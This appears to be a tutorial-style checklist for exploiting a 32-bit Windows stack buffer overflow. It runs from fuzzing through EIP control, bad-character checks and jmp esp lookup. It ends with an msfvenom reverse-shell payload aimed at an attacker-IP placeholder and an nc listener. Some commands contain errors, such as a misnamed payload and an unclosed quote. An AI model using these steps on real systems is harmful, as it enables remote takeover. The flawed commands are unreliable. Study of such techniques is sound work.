1. Connect to the vulnerable service
2. Fuzzing
	try to crash the vulnerable servic eby sending increasing number to a service variable of bytes every consecutive connection.
3. Replicate the crash
	After getting approximate number of bytes with which the service crashed, try to create a standalone script to crash it again with the specific number of bytes.
4. Locate EIP
	Now, that we know how many minimum bytes to send to crash the service, send a string generated by metasploit's pattern_create.rb tool as buffer.
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number-of-bytes-which-crash-the-service>
	Note the bytes in Immunity Debugger which ocupy EIP variable. Use pattern_offset.rb to locate the position of those specific bytes in the pattern created.
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <pattern>
	We find at what byte number does EIP gets filled. So, try to crash the application again, this time, make sure that instead of "A"'s , 4 "B"'s fill out the EIP and rest of stack is filled by "C"'s.
	Try to make number of "C"'s inside the stack to be minimum 360 bytes as 360 bytes is minimum length of shellcode.
5. Locate Bad characters
	Instead of "C"'s,put a string of bad characters. Exclude \x00 as it is already a bad character.
	In Immunity Debugger, follow ESP in dump, locate the start of bad characters string and find out if any bad cahracter is missing or messes up the stack.
	Exclude out those bad characters and note them down.
6. Finding jmp esp
	use nasm shell to find code for jmp esp which is ffe4 or \xff\xe4.
	in Immuntiy Debugger, type !mona modules to find vulnerable dll's with jmp esp instruction. Find a dll with no bad character in its name and with DEP and ASLR turned off.
	type !mona find -s "\xff\xe4" -m <module_name> to find location of jmp esp instruction in that dll. Note down its value.
	Set a breakpoint on that address using F2
	Insert the address found in place of "B"'s i.e where EIP is filled, in 32 bit little endian format. Eg. 71C8437E ==> \x7e\x43\xc8\x71
	Run the exploit. We hit a breakpoint in Immunity Debugger. Hit F to continue execution. We find out stack pointer pointing towards the bunch of "C"'s.
	We can now successfully redirect the execution.
	In place of "C"'s, we are going to place our shellcode.
7. Generate Shellcode
	msfvenom -p windows/reverse_shell_tcp lhost=<attacker-ip> lport=<attacker-port> -f c -e x86/shikata_ga_nai -a x86 --platform windows -b "<bad-chars-found> -o shellcode.txt
	paste the shellcode in place of "C"'s
8. Final touches and running the exploit
	Insert a random number of nops "\x90" ,preferably around 18, before the shellcode and after jmp esp address.
	After rechecking the code , run it and wait for a reverse shell connection in another terminal nc -lvnp <attacking-port>
